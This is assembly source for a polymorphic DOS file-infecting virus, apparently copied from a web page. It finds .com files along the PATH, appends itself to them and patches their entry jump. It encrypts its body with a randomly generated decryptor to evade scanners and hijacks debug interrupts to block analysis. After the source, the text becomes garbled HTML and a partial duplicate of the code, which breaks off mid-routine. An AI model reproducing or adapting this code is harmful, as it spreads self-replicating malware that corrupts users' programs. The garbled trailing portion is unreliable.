

;
;
; Copyright (C) Mark Washburn, 1990, 1991.  All Rights Reserved
;
;
; Inquires are directed to :
; Mark Washburn
; 4656 Polk Street NE
; Columbia Heights, MN 55421
; USA
;
;
;
;
CODE        SEGMENT PUBLIC 'CODE'
            ORG     100H
;
            ASSUME  CS: CODE,DS: CODE,ES: CODE
;

STOPDEBUG   EQU     1               ; define this for disassembly trap code
INT1VEC     EQU     4
INT3VEC     EQU     12
;
DTA_PTR     EQU     -4
FILE_CREA   EQU     -8
FILE_ATTR   EQU     -10
PATH_START_PTR EQU  -12
FILE_START_PTR EQU  -14
RAND_SEED   EQU     -16
PTR1        EQU     -18             ; pointer to start of loop code
PTR2        EQU     -20             ; save data_begin pointer
DAT1        EQU     -22             ; the random code used
DAT2        EQU     -24             ; the decode length plus random length offset, max_msk
                                    ; to make the decode routine more difficult to detect
DAT3        EQU     -26             ; the 'necessary crypt code' mask
;
IFNDEF      STOPDEBUG
LOCAL_STACK EQU     26
MAX_MSK     EQU     0FFH            ; this determines the maximum variance of length
ELSE
NOBUGPTR    EQU     -28
OLDINT3     EQU     -32
OLDINT1     EQU     -36
LOCAL_STACK EQU     36
MAX_MSK     EQU     0FFH            ; this determines the maximum variance of length
ENDIF
;
;
;
DOSCALL     MACRO   CALL_TYPE
            IFNB    <call_type>
            MOV     AH, CALL_TYPE
            ENDIF
            INT     21H
            ENDM
;
SETLOC      MACRO   ARG1,REG2
            MOV     [BP + ARG1],REG2
            ENDM
;
GETLOC      MACRO   REG1,ARG2
            MOV     REG1,[BP + ARG2]
            ENDM
;
SETDAT      MACRO   ARG1,REG2
            MOV     [SI + OFFSET ARG1 - OFFSET DATA_BEGIN],REG2
            ENDM
;
GETDAT      MACRO   REG1,ARG2
            MOV     REG1,[SI + OFFSET ARG2 - OFFSET DATA_BEGIN]
            ENDM
;
REGOFS      MACRO   REG1,ARG2
            MOV     REG1,SI
            ADD     REG1,OFFSET (ARG2 - DATA_BEGIN)
            ENDM
;
NOBUG1      MACRO
IFDEF       STOPDEBUG
            INT     3
            NOP
ENDIF
            ENDM
;
NOBUG2      MACRO
IFDEF       STOPDEBUG
            INT     3
ENDIF
            ENDM
;
;
START:
            JMP     ENTRY
;
;
;
            MOV     AH,0
            INT     021H            ; program code
;                db      600h-6 dup (0)
; insert utility code here
;
ENTRY:
; space for decode routine
IFDEF       STOPDEBUG
            CALL    PRECRYPT
            DB      36 DUP (090H)   ; calculated length of offset(t41-t10)
ELSE
            DB      39 DUP (090H)   ; calculated length of offset(t41-t10)
ENDIF
;
; label the start of encoded section
ENTRY2:
            MOV     BP,SP           ; allocate locals
            SUB     SP,LOCAL_STACK
;
            PUSH    CX
MOVCMD:                             ; this label is used to locate the next instruction
            MOV     DX,OFFSET DATA_BEGIN
            SETLOC  PTR2,DX         ; save - will be modified in 'gencode'
IFDEF       STOPDEBUG
;
; save interrupt 1 and 3 vectors
;
            PUSH    DS
            MOV     AX,0
            PUSH    AX
            POP     DS
            CLI
            MOV     AX,DS: [INT1VEC]
            SETLOC  OLDINT1,AX
            MOV     AX,DS: [INT1VEC+2]
            SETLOC  OLDINT1+2,AX
            MOV     AX,DS: [INT3VEC]
            SETLOC  OLDINT3,AX
            MOV     AX,DS: [INT3VEC+2]
            SETLOC  OLDINT3+2,AX
            STI
            POP     DS
;
            CALL    BUGON
ENDIF
            MOV     SI,DX
            ADD     SI,(OFFSET OLD_CODE - OFFSET DATA_BEGIN)
            MOV     DI,0100H
            MOV     CX,03H
            CLD
            REPZ    MOVSB
            MOV     SI,DX
            DOSCALL 30H             ; check DOS version
            CMP     AL,0
            NOBUG1                  ; 0
            JNZ     CONT1           ; DOS > 2.0
            JMP     EXIT
CONT1:
            PUSH    ES
            DOSCALL 2FH             ; get program DTA
            NOBUG1                  ; 0
            SETLOC  DTA_PTR,BX
            NOBUG1                  ; 0
            SETLOC  DTA_PTR+2,ES
            POP     ES
            REGOFS  DX,MY_DTA
            DOSCALL 1AH             ; set new DTA
            PUSH    ES
            PUSH    SI
            MOV     ES,DS: [02CH]   ; environment address
            MOV     DI,0
LOOP1:
            POP     SI
            PUSH    SI
            ADD     SI,(OFFSET PATH_CHARS - OFFSET DATA_BEGIN)
            LODSB
            MOV     CX,8000H
            REPNZ   SCASB
            MOV     CX,4
LOOP2:
            LODSB
            SCASB
            JNZ     LOOP1
            LOOP    LOOP2
            POP     SI
            POP     ES
            SETLOC  PATH_START_PTR,DI
            MOV     BX,SI
            ADD     SI,OFFSET (FILE_NAME-DATA_BEGIN)
            MOV     DI,SI
            JMP     CONT6
            NOBUG2
NEXT_PATH:
            CMP     WORD PTR [BP + PATH_START_PTR],0
            JNZ     CONT3
            JMP     EXIT2
            NOBUG2
CONT3:
            PUSH    DS
            PUSH    SI
            MOV     DS,ES: [002CH]

            MOV     DI,SI
            MOV     SI,ES: [BP+PATH_START_PTR]
            ADD     DI,OFFSET (FILE_NAME-DATA_BEGIN)
LOOP3:
            LODSB
            CMP     AL,';'          ; 3bh
            JZ      CONT4
            CMP     AL,0
            JZ      CONT5
            STOSB
            JMP     LOOP3
            NOBUG2
CONT5:
            MOV     SI,0
CONT4:
            POP     BX
            POP     DS
            MOV     [BP+PATH_START_PTR],SI
            CMP     CH,0FFH
            JZ      CONT6
            MOV     AL,'\'          ; 5ch
            STOSB
CONT6:
            MOV     [BP+FILE_START_PTR],DI
            MOV     SI,BX
            ADD     SI,(OFFSET COM_SEARCH-OFFSET DATA_BEGIN)
            MOV     CX,6
            REPZ    MOVSB
            MOV     SI,BX
            MOV     AH,04EH
            REGOFS  DX,FILE_NAME
            MOV     CX,3
            DOSCALL
            JMP     CONT7
            NOBUG2
NEXT_FILE:
            DOSCALL 04FH
CONT7:
            JNB     CONT8
            JMP     NEXT_PATH
            NOBUG2
CONT8:
            MOV     AX,[SI+OFFSET(MY_DTA-DATA_BEGIN)+016H] ; low time byte
            AND     AL,01FH
            CMP     AL,01FH
            JZ      NEXT_FILE
IFNDEF      STOPDEBUG
            CMP     WORD PTR [SI+OFFSET(MY_DTA-DATA_BEGIN)+01AH],0FA00H
                                    ; file length compared; need 1.5 k spare, see rnd off
ELSE
            CMP     WORD PTR [SI+OFFSET(MY_DTA-DATA_BEGIN)+01AH],0F800H
ENDIF
            JZ      NEXT_FILE       ;    with virus length
            CMP     WORD PTR [SI+OFFSET(MY_DTA-DATA_BEGIN)+01AH],0AH
                                    ; file to short
            JZ      NEXT_FILE
            MOV     DI,[BP+FILE_START_PTR]
            PUSH    SI
            ADD     SI,OFFSET(MY_DTA-DATA_BEGIN+01EH)
MOVE_NAME:
            LODSB
            STOSB
            CMP     AL,0
            JNZ     MOVE_NAME
            POP     SI
            MOV     AX,04300H
            REGOFS  DX,FILE_NAME
            DOSCALL
            SETLOC  FILE_ATTR,CX
            MOV     AX,04301H
            AND     CX,0FFFEH
            REGOFS  DX,FILE_NAME
            DOSCALL
            MOV     AX,03D02H
            REGOFS  DX,FILE_NAME
            DOSCALL
            JNB     CONT9
            JMP     EXIT3
            NOBUG2
CONT9:
            MOV     BX,AX
            MOV     AX,05700H
            DOSCALL
            SETLOC  FILE_CREA,CX
            SETLOC  FILE_CREA+2,DX
CONT10:
            MOV     AH,3FH
            MOV     CX,3
            REGOFS  DX,OLD_CODE
            DOSCALL
            NOBUG1                  
            JB      CONT98
            NOBUG1
            CMP     AX,3
            NOBUG1
            JNZ     CONT98
            NOBUG1
            MOV     AX,04202H
            NOBUG1                  
            MOV     CX,0
            MOV     DX,0
            DOSCALL
            JNB     CONT99
CONT98:
            JMP     EXIT4
CONT99:
            NOBUG1                  
            PUSH    BX              ; save file handle
            NOBUG1
            MOV     CX,AX
            PUSH    CX
            NOBUG1
            SUB     AX,3
            NOBUG1
            SETDAT  JUMP_CODE+1,AX
            ADD     CX,(OFFSET DATA_BEGIN-OFFSET ENTRY+0100H)
            NOBUG1
            MOV     DI,SI
            NOBUG1
            SUB     DI,OFFSET DATA_BEGIN-OFFSET MOVCMD-1
            NOBUG1
            MOV     [DI],CX
;
            DOSCALL 02CH            ; seed the random number generator
            XOR     DX,CX
            NOBUG1
            SETLOC  RAND_SEED,DX
            NOBUG1                  
            CALL    RANDOM
            NOBUG1                  
            GETLOC  AX,RAND_SEED
            NOBUG1                  
            AND     AX,MAX_MSK      ; add a random offset to actual length
            NOBUG1                  
            ADD     AX,OFFSET (DATA_END-ENTRY2) ; set decode length
            NOBUG1                  
            SETLOC  DAT2,AX         ; save the decode length
            NOBUG1                  
            SETDAT  (T13+1),AX      ; set decode length in 'mov cx,xxxx'
            POP     CX              ; restore the code length of file to be infected
            NOBUG1                  
            ADD     CX,OFFSET (ENTRY2-ENTRY+0100H) ; add the length
                                    ; of uncoded area plus file offset
            SETDAT  (T11+1),CX      ;  set decode begin in 'mov di,xxxx'
            NOBUG1                  
            CALL    RANDOM
            GETLOC  AX,RAND_SEED
            NOBUG1                  
            SETLOC  DAT1,AX         ; save this random key in dat1
            SETDAT  (T12+1),AX      ; set random key in 'mov ax,xxxx'
            NOBUG1                  
            MOV     DI,SI
            NOBUG1                  
            SUB     DI,OFFSET (DATA_BEGIN-ENTRY)
            NOBUG1                  
            MOV     BX,SI
            ADD     BX,OFFSET (L11-DATA_BEGIN) ; table L11 address
            MOV     WORD PTR [BP+DAT3],000000111B ; required routines
            CALL    GEN2            ; generate first part of decrypt
            SETLOC  PTR1,DI         ; save the current counter to resolve 'loop'
            ADD     BX,OFFSET (L21-L11) ; add then next tables' offset
            NOBUG1                  
            MOV     WORD PTR [BP+DAT3],010000011B ; required plus 'nop'
            NOBUG1                  
            CALL    GEN2            ; generate second part of decrypt
            ADD     BX,OFFSET (L31-L21) ; add the next offset
            NOBUG1
            CALL    GEN2            ; generate third part of decrypt
            MOV     CX,2            ; store the loop code
            GETLOC  SI,PTR2
            NOBUG1                  
            ADD     SI,OFFSET (T40-T10) ; point to the code
            REPZ    MOVSB           ; move the code
            GETLOC  AX,PTR1         ; the loop address pointer
            SUB     AX,DI           ; the current address
            DEC     DI              ; point to the jump address
            STOSB                   ; resolve the jump
; fill in the remaining code
L991:
            GETLOC  CX,PTR2         ; get the data_begin pointer
            SUB     CX,OFFSET (DATA_BEGIN-ENTRY2) ; locate last+1 entry
            CMP     CX,DI           ; are we there yet?
            JE      L992            ; if not then fill some more space
            MOV     DX,0H           ; any code is ok
            CALL    GENCODE         ; generate the code
            JMP     L991
            NOBUG2
L992:
            GETLOC  SI,PTR2         ; restore si to point to data area ;
            PUSH    SI
            MOV     DI,SI
            NOBUG1                  
            MOV     CX,OFFSET(END1-BEGIN1) ;   move code
            ADD     SI,OFFSET(BEGIN1-DATA_BEGIN)
            NOBUG1                  
            ADD     DI,OFFSET(DATA_END-DATA_BEGIN+MAX_MSK) ; add max_msk
            MOV     DX,DI           ; set subroutine start
            REPZ    MOVSB           ; move the code
            POP     SI
            POP     BX              ; restore handle
            CALL    SETRTN          ; find this address
            ADD     AX,06H          ; <- the number necessary for proper return
            push    ax
            jmp     dx              ; continue with mask & write code
; continue here after return from mask & write code
            nobug1                  
            jb      exit4
            cmp     ax,offset(data_end-entry)
            nobug1                  
            jnz     exit4
            mov     ax,04200h
            mov     cx,0
            mov     dx,0
            doscall
            jb      exit4
            mov     ah,040h
            mov     cx,3
            nobug1                  
            regofs  dx,jump_code
            doscall
exit4:
            getloc  dx,file_crea+2
            getloc  cx,file_crea
            and     cx,0ffe0h
            or      cx,0001fh
            mov     ax,05701h
            doscall
            doscall 03eh            ; close file
exit3:
            mov     ax,04301h
            getloc  cx,file_attr
            regofs  dx,file_name
            doscall
exit2:
            push    ds
            getloc  dx,dta_ptr
            getloc  ds,dta_ptr+2
            doscall 01ah
            pop     ds
exit:
            pop     cx
            xor     ax,ax
            xor     bx,bx
            xor     dx,dx
            xor     si,si
            mov     sp,bp           ; deallocate locals
            mov     di,0100h
            push    di
            call    bugoff
            ret
;
; common subroutines
;
;
random      proc    near
;
            getloc  cx,rand_seed    ; get the seed
            xor     cx,813ch        ; xor random pattern
            add     cx,9248h        ; add random pattern
            ror     cx,1            ; rotate
            ror     cx,1            ; three
            ror     cx,1            ; times.
            setloc  rand_seed,cx    ; put it back
            and     cx,7            ; only need lower 3 bits
            push    cx
            inc     cx
            xor     ax,ax
            stc
            rcl     ax,cl
            pop     cx
            ret                     ; return
;
random      endp
;
setrtn      proc    near
;
            pop     ax              ; ret near
            push    ax
            ret
;
setrtn      endp
;
gencode     proc    near
;
l999:
            call    random
            test    dx,ax           ; has this code been used yet?
            jnz     l999            ; if this code was generated - try again
            or      dx,ax           ; set the code as used in dx
            mov     ax,cx           ; the look-up index
            sal     ax,1
            push    ax
            xlat
            mov     cx,ax           ; the count of instructions
            pop     ax
            inc     ax
            xlat
            add     ax,[bp+ptr2]    ; ax = address of code to be moved
            mov     si,ax
            repz    movsb           ; move the code into place
            ret
;
gencode     endp
;
gen2        proc    near
;
            mov     dx,0h           ; used code
l990:
            call    gencode
            mov     ax,dx           ; do we need more code
            and     ax,[bp+dat3]    ; the mask for the required code
            cmp     ax,[bp+dat3]
            jne     l990            ; if still need required code - loop again
            ret
;
gen2        endp
;
ifdef       stopdebug
doint3:
            push    bx
            mov     bx,sp
            push    ax
            push    si
            mov     si,word ptr [bx+02]
            inc     word ptr [bx+02] ; point to next address
            setloc  nobugptr,si
            lodsb                   ; get the byte following int 3
            xor     byte ptr [si],al
            mov     al,[bx+7]       ; set the trap flag
            or      al,1
            mov     [bx+7],al
            pop     si
            pop     ax
            pop     bx
            iret
;
doint1:
            push    bx
            mov     bx,sp
            push    ax
            push    si
            getloc  si,nobugptr
            lodsb
            xor     byte ptr [si],al
            mov     al,[bx+7]       ; clear the trap flag
            and     al,0feh
            mov     [bx+7],al
            pop     si
            pop     ax
            pop     bx
bugiret:
            iret
;
bugon:
            pushf
            push    ds
            push    ax
            mov     ax,0
            push    ax
            pop     ds
            getloc  ax,ptr2
            sub     ax,offset(data_begin-doint3)
            cli
            mov     ds: [int3vec],ax
            getloc  ax,ptr2
            sub     ax,offset(data_begin-doint1)
            mov     ds: [int1vec],ax
            push    cs
            pop     ax
            mov     ds: [int1vec+2],ax
            mov     ds: [int3vec+2],ax
            sti
            pop     ax
            pop     ds
            popf
            ret
;
bugoff:
            pushf
            push    ds
            push    ax
            mov     ax,0
            push    ax
            pop     ds

            getloc  ax,oldint3
            cli
            mov     ds: [int3vec],ax
            getloc  ax,oldint1
            mov     ds: [int1vec],ax
            getloc  ax,oldint1+2
            mov     ds: [int1vec+2],ax
            getloc  ax,oldint3+2
            mov     ds: [int3vec+2],ax
            sti

            pop     ax
            pop     ds
            popf
            ret
;
endif
;
;
; the data area
;
data_begin  label   near
;
t10         label   near
t11:        mov     di,0ffffh
t12:        mov     ax,0ffffh
t13:        mov     cx,0ffffh
t14:        clc
t15:        cld
t16:        inc     si
t17:        dec     bx
t18:        nop
t19         label   near
;
t20         label   near
t21:        xor     [di],ax
t22:        xor     [di],cx
t23:        xor     dx,cx
t24:        xor     bx,cx
t25:        sub     bx,ax
t26:        sub     bx,cx
t27:        sub     bx,dx
t28:        nop
t29         label   near
;
t30         label   near
t31:        inc     ax
t32:        inc     di
t33:        inc     bx
t34:        inc     si
t35:        inc     dx
t36:        clc
t37:        dec     bx
t38:        nop
t39         label   near
;
t40:        loop    t20
t41         label   near
;
l11:        db      offset (t12-t11),offset (t11-data_begin)
l12:        db      offset (t13-t12),offset (t12-data_begin)
l13:        db      offset (t14-t13),offset (t13-data_begin)
l14:        db      offset (t15-t14),offset (t14-data_begin)
l15:        db      offset (t16-t15),offset (t15-data_begin)
l16:        db      offset (t17-t16),offset (t16-data_begin)
l17:        db      offset (t18-t17),offset (t17-data_begin)
l18:        db      offset (t19-t18),offset (t18-data_begin)
;
l21:        db      offset (t22-t21),offset (t21-data_begin)
l22:        db      offset (t23-t22),offset (t22-data_begin)
l23:        db      offset (t24-t23),offset (t23-data_begin)
l24:        db      offset (t25-t24),offset (t24-data_begin)
l25:        db      offset (t26-t25),offset (t25-data_begin)
l26:        db      offset (t27-t26),offset (t26-data_begin)
l27:        db      offset (t28-t27),offset (t27-data_begin)
l28:        db      offset (t29-t28),offset (t28-data_begin)
;
l31:        db      offset (t32-t31),offset (t31-data_begin)
l32:        db      offset (t33-t32),offset (t32-data_begin)
l33:        db      offset (t34-t33),offset (t33-data_begin)
l34:        db      offset (t35-t34),offset (t34-data_begin)
l35:        db      offset (t36-t35),offset (t35-data_begin)
l36:        db      offset (t37-t36),offset (t36-data_begin)
l37:        db      offset (t38-t37),offset (t37-data_begin)
l38:        db      offset (t39-t38),offset (t38-data_begin)
;
;
;
; this routine is relocated after the end of data area
; this routine encrypts, writes, and decrypts the virus code
;
begin1:
            getloc  cx,dat2         ; get off (data_end-entry2) plus max_msk
            getloc  ax,dat1         ; get decode ket
            mov     di,si           ; and set the begin encrypt address
            sub     di,offset (data_begin-entry2)
            call    crypt
            mov     ah,040h
            mov     cx,offset data_end-offset entry
            mov     dx,si
            sub     dx,offset data_begin-offset entry
            doscall
            pushf                   ; save the status of the write
            push    ax
            getloc  cx,dat2         ; get off (data_end-entry2) plus max_msk
            getloc  ax,dat1
            mov     di,si
            sub     di,offset (data_begin-entry2)
            call    crypt
            pop     ax              ; restore the dos write's status
            popf
            ret
;
crypt:
            xor     [di],ax
            xor     [di],cx
            inc     ax
            inc     di
            loop    crypt
            ret
end1:
;
; global work space and constants
;
old_code:   db      090h,090h,090h
jump_code:  db      0e9h,0,0
com_search: db      '*.com',0
path_chars: db      'path='
file_name:  db      40h dup (0)
my_dta:     db      2bh dup (0)
            db      0,0,0

data_end    label   near
ifdef       stopdebug
;
scan_bytes  db      0cch,090h
;
precrypt:
            mov     bp,sp           ; allocate locals
            sub     sp,local_stack
            doscall 02ch            ; seed the random number generator
            xor     dx,cx
            setloc  rand_seed,dx
            call    random
            mov     di,offset start
            push    ds
            pop     es
lp999:
            mov     cx,08000h
            mov     si,offset scan_bytes
            lodsb
            repnz   scasb
            cmp     cx,0
            je      done998
            cmp     di,offset data_end
            jge     done998
            lodsb
            scasb
            jnz     lp999
            call    random
            getloc  ax,rand_seed
            dec     di
            mov     [di],al
            inc     di
            xor     [di],al
            inc     di              ; skip the masked byte
            jmp     short lp999
done998:
            mov     sp,bp
            ret
endif

code        ends
            end     start

</textarea></td></tr></table></body></html>
 the="" number="" necessary="" for="" proper="" return="" push="" ax="" jmp="" dx="" ;="" continue="" with="" mask="" &="" write="" code="" ;="" continue="" here="" after="" return="" from="" mask="" &="" write="" code="" nobug1="" jb="" exit4="" cmp="" ax,offset(data_end-entry)="" nobug1="" jnz="" exit4="" mov="" ax,04200h="" mov="" cx,0="" mov="" dx,0="" doscall="" jb="" exit4="" mov="" ah,040h="" mov="" cx,3="" nobug1="" regofs="" dx,jump_code="" doscall="" exit4:="" getloc="" dx,file_crea+2="" getloc="" cx,file_crea="" and="" cx,0ffe0h="" or="" cx,0001fh="" mov="" ax,05701h="" doscall="" doscall="" 03eh="" ;="" close="" file="" exit3:="" mov="" ax,04301h="" getloc="" cx,file_attr="" regofs="" dx,file_name="" doscall="" exit2:="" push="" ds="" getloc="" dx,dta_ptr="" getloc="" ds,dta_ptr+2="" doscall="" 01ah="" pop="" ds="" exit:="" pop="" cx="" xor="" ax,ax="" xor="" bx,bx="" xor="" dx,dx="" xor="" si,si="" mov="" sp,bp="" ;="" deallocate="" locals="" mov="" di,0100h="" push="" di="" call="" bugoff="" ret="" ;="" ;="" common="" subroutines="" ;="" ;="" random="" proc="" near="" ;="" getloc="" cx,rand_seed="" ;="" get="" the="" seed="" xor="" cx,813ch="" ;="" xor="" random="" pattern="" add="" cx,9248h="" ;="" add="" random="" pattern="" ror="" cx,1="" ;="" rotate="" ror="" cx,1="" ;="" three="" ror="" cx,1="" ;="" times.="" setloc="" rand_seed,cx="" ;="" put="" it="" back="" and="" cx,7="" ;="" only="" need="" lower="" 3="" bits="" push="" cx="" inc="" cx="" xor="" ax,ax="" stc="" rcl="" ax,cl="" pop="" cx="" ret="" ;="" return="" ;="" random="" endp="" ;="" setrtn="" proc="" near="" ;="" pop="" ax="" ;="" ret="" near="" push="" ax="" ret="" ;="" setrtn="" endp="" ;="" gencode="" proc="" near="" ;="" l999:="" call="" random="" test="" dx,ax="" ;="" has="" this="" code="" been="" used="" yet?="" jnz="" l999="" ;="" if="" this="" code="" was="" generated="" -="" try="" again="" or="" dx,ax="" ;="" set="" the="" code="" as="" used="" in="" dx="" mov="" ax,cx="" ;="" the="" look-up="" index="" sal="" ax,1="" push="" ax="" xlat="" mov="" cx,ax="" ;="" the="" count="" of="" instructions="" pop="" ax="" inc="" ax="" xlat="" add="" ax,[bp+ptr2]="" ;="" ax="address" of="" code="" to="" be="" moved="" mov="" si,ax="" repz="" movsb="" ;="" move="" the="" code="" into="" place="" ret="" ;="" gencode="" endp="" ;="" gen2="" proc="" near="" ;="" mov="" dx,0h="" ;="" used="" code="" l990:="" call="" gencode="" mov="" ax,dx="" ;="" do="" we="" need="" more="" code="" and="" ax,[bp+dat3]="" ;="" the="" mask="" for="" the="" required="" code="" cmp="" ax,[bp+dat3]="" jne="" l990="" ;="" if="" still="" need="" required="" code="" -="" loop="" again="" ret="" ;="" gen2="" endp="" ;="" ifdef="" stopdebug="" doint3:="" push="" bx="" mov="" bx,sp="" push="" ax="" push="" si="" mov="" si,word="" ptr="" [bx+02]="" inc="" word="" ptr="" [bx+02]="" ;="" point="" to="" next="" address="" setloc="" nobugptr,si="" lodsb="" ;="" get="" the="" byte="" following="" int="" 3="" xor="" byte="" ptr="" [si],al="" mov="" al,[bx+7]="" ;="" set="" the="" trap="" flag="" or="" al,1="" mov="" [bx+7],al="" pop="" si="" pop="" ax="" pop="" bx="" iret="" ;="" doint1:="" push="" bx="" mov="" bx,sp="" push="" ax="" push="" si="" getloc="" si,nobugptr="" lodsb="" xor="" byte="" ptr="" [si],al="" mov="" al,[bx+7]="" ;="" clear="" the="" trap="" flag="" and="" al,0feh="" mov="" [bx+7],al="" pop="" si="" pop="" ax="" pop="" bx="" bugiret:="" iret="" ;="" bugon:="" pushf="" push="" ds="" push="" ax="" mov="" ax,0="" push="" ax="" pop="" ds="" getloc="" ax,ptr2="" sub="" ax,offset(data_begin-doint3)="" cli="" mov="" ds:="" [int3vec],ax="" getloc="" ax,ptr2="" sub="" ax,offset(data_begin-doint1)="" mov="" ds:="" [int1vec],ax="" push="" cs="" pop="" ax="" mov="" ds:="" [int1vec+2],ax="" mov="" ds:="" [int3vec+2],ax="" sti="" pop="" ax="" pop="" ds="" popf="" ret="" ;="" bugoff:="" pushf="" push="" ds="" push="" ax="" mov="" ax,0="" push="" ax="" pop="" ds="" getloc="" ax,oldint3="" cli="" mov="" ds:="" [int3vec],ax="" getloc="" ax,oldint1="" mov="" ds:="" [int1vec],ax="" getloc="" ax,oldint1+2="" mov="" ds:="" [int1vec+2],ax="" getloc="" ax,oldint3+2="" mov="" ds:="" [int3vec+2],ax="" sti="" pop="" ax="" pop="" ds="" popf="" ret="" ;="" endif="" ;="" ;="" ;="" the="" data="" area="" ;="" data_begin="" label="" near="" ;="" t10="" label="" near="" t11:="" mov="" di,0ffffh="" t12:="" mov="" ax,0ffffh="" t13:="" mov="" cx,0ffffh="" t14:="" clc="" t15:="" cld="" t16:="" inc="" si="" t17:="" dec="" bx="" t18:="" nop="" t19="" label="" near="" ;="" t20="" label="" near="" t21:="" xor="" [di],ax="" t22:="" xor="" [di],cx="" t23:="" xor="" dx,cx="" t24:="" xor="" bx,cx="" t25:="" sub="" bx,ax="" t26:="" sub="" bx,cx="" t27:="" sub="" bx,dx="" t28:="" nop="" t29="" label="" near="" ;="" t30="" label="" near="" t31:="" inc="" ax="" t32:="" inc="" di="" t33:="" inc="" bx="" t34:="" inc="" si="" t35:="" inc="" dx="" t36:="" clc="" t37:="" dec="" bx="" t38:="" nop="" t39="" label="" near="" ;="" t40:="" loop="" t20="" t41="" label="" near="" ;="" l11:="" db="" offset="" (t12-t11),offset="" (t11-data_begin)="" l12:="" db="" offset="" (t13-t12),offset="" (t12-data_begin)="" l13:="" db="" offset="" (t14-t13),offset="" (t13-data_begin)="" l14:="" db="" offset="" (t15-t14),offset="" (t14-data_begin)="" l15:="" db="" offset="" (t16-t15),offset="" (t15-data_begin)="" l16:="" db="" offset="" (t17-t16),offset="" (t16-data_begin)="" l17:="" db="" offset="" (t18-t17),offset="" (t17-data_begin)="" l18:="" db="" offset="" (t19-t18),offset="" (t18-data_begin)="" ;="" l21:="" db="" offset="" (t22-t21),offset="" (t21-data_begin)="" l22:="" db="" offset="" (t23-t22),offset="" (t22-data_begin)="" l23:="" db="" offset="" (t24-t23),offset="" (t23-data_begin)="" l24:="" db="" offset="" (t25-t24),offset="" (t24-data_begin)="" l25:="" db="" offset="" (t26-t25),offset="" (t25-data_begin)="" l26:="" db="" offset="" (t27-t26),offset="" (t26-data_begin)="" l27:="" db="" offset="" (t28-t27),offset="" (t27-data_begin)="" l28:="" db="" offset="" (t29-t28),offset="" (t28-data_begin)="" ;="" l31:="" db="" offset="" (t32-t31),offset="" (t31-data_begin)="" l32:="" db="" offset="" (t33-t32),offset="" (t32-data_begin)="" l33:="" db="" offset="" (t34-t33),offset="" (t33-data_begin)="" l34:="" db="" offset="" (t35-t34),offset="" (t34-data_begin)="" l35:="" db="" offset="" (t36-t35),offset="" (t35-data_begin)="" l36:="" db="" offset="" (t37-t36),offset="" (t36-data_begin)="" l37:="" db="" offset="" (t38-t37),offset="" (t37-data_begin)="" l38:="" db="" offset="" (t39-t38),offset="" (t38-data_begin)="" ;="" ;="" ;="" ;="" this="" routine="" is="" relocated="" after="" the="" end="" of="" data="" area="" ;="" this="" routine="" encrypts,="" writes,="" and="" decrypts="" the="" virus="" code="" ;="" begin1:="" getloc="" cx,dat2="" ;="" get="" off="" (data_end-entry2)="" plus="" max_msk="" getloc="" ax,dat1="" ;="" get="" decode="" ket="" mov="" di,si="" ;="" and="" set="" the="" begin="" encrypt="" address="" sub="" di,offset="" (data_begin-entry2)="" call="" crypt="" mov="" ah,040h="" mov="" cx,offset="" data_end-offset="" entry="" mov="" dx,si="" sub="" dx,offset="" data_begin-offset="" entry="" doscall="" pushf="" ;="" save="" the="" status="" of="" the="" write="" push="" ax="" getloc="" cx,dat2="" ;="" get="" off="" (data_end-entry2)="" plus="" max_msk="" getloc="" ax,dat1="" mov="" di,si="" sub="" di,offset="" (data_begin-entry2)="" call="" crypt="" pop="" ax="" ;="" restore="" the="" dos="" write's="" status="" popf="" ret="" ;="" crypt:="" xor="" [di],ax="" xor="" [di],cx="" inc="" ax="" inc="" di="" loop="" crypt="" ret="" end1:="" ;="" ;="" global="" work="" space="" and="" constants="" ;="" old_code:="" db="" 090h,090h,090h="" jump_code:="" db="" 0e9h,0,0="" com_search:="" db="" '*.com',0="" path_chars:="" db="" 'path=''></- the number necessary for proper return
            push    ax
            jmp     dx              ; continue with mask & write code
; continue here after return from mask & write code
            nobug1                  
            jb      exit4
            cmp     ax,offset(data_end-entry)
            nobug1                  
            jnz     exit4
            mov     ax,04200h
            mov     cx,0
            mov     dx,0
            doscall
            jb      exit4
            mov     ah,040h
            mov     cx,3
            nobug1                  
            regofs  dx,jump_code
            doscall
exit4:
            getloc  dx,file_crea+2
            getloc  cx,file_crea
            and     cx,0ffe0h
            or      cx,0001fh
            mov     ax,05701h
            doscall
            doscall 03eh            ; close file
exit3:
            mov     ax,04301h
            getloc  cx,file_attr
            regofs  dx,file_name
            doscall
exit2:
            push    ds
            getloc  dx,dta_ptr
            getloc  ds,dta_ptr+2
            doscall 01ah
            pop     ds
exit:
            pop     cx
            xor     ax,ax
            xor     bx,bx
            xor     dx,dx
            xor     si,si
            mov     sp,bp           ; deallocate locals
            mov     di,0100h
            push    di
            call    bugoff
            ret
;
; common subroutines
;
;
random      proc    near
;
            getloc  cx,rand_seed    ; get the seed
            xor     cx,813ch        ; xor random pattern
            add     cx,9248h        ; add random pattern
            ror     cx,1            ; rotate
            ror     cx,1            ; three
            ror     cx,1            ; times.
            setloc  rand_seed,cx    ; put it back
            and     cx,7            ; only need lower 3 bits
            push    cx
            inc     cx
            xor     ax,ax
            stc
            rcl     ax,cl
            pop     cx
            ret                     ; return
;
random      endp
;
setrtn      proc    near
;
            pop     ax              ; ret near
            push    ax
            ret
;
setrtn      endp
;
gencode     proc    near
;
l999:
            call    random
            test    dx,ax           ; has this code been used yet?
            jnz     l999            ; if this code was generated - try again
            or      dx,ax           ; set the code as used in dx
            mov     ax,cx           ; the look-up index
            sal     ax,1
            push    ax
            xlat
            mov     cx,ax           ; the count of instructions
            pop     ax
            inc     ax
            xlat
            add     ax,[bp+ptr2]    ; ax = address of code to be moved
            mov     si,ax
            repz    movsb           ; move the code into place
            ret
;
gencode     endp
;
gen2        proc    near
;
            mov     dx,0h           ; used code
l990:
            call    gencode
            mov     ax,dx           ; do we need more code
            and     ax,[bp+dat3]    ; the mask for the required code
            cmp     ax,[bp+dat3]
            jne     l990            ; if still need required code - loop again
            ret
;
gen2        endp
;
ifdef       stopdebug
doint3:
            push    bx
            mov     bx,sp
            push    ax
            push    si
            mov     si,word ptr [bx+02]
            inc     word ptr [bx+02] ; point to next address
            setloc  nobugptr,si
            lodsb                   ; get the byte following int 3
            xor     byte ptr [si],al
            mov     al,[bx+7]       ; set the trap flag
            or      al,1
            mov     [bx+7],al
            pop     si
            pop     ax
            pop     bx
            iret
;
doint1:
            push    bx
            mov     bx,sp
            push    ax
            push    si
            getloc  si,nobugptr
            lodsb
            xor     byte ptr [si],al
            mov     al,[bx+7]       ; clear the trap flag
            and     al,0feh
            mov     [bx+7],al
            pop     si
            pop     ax
            pop     bx
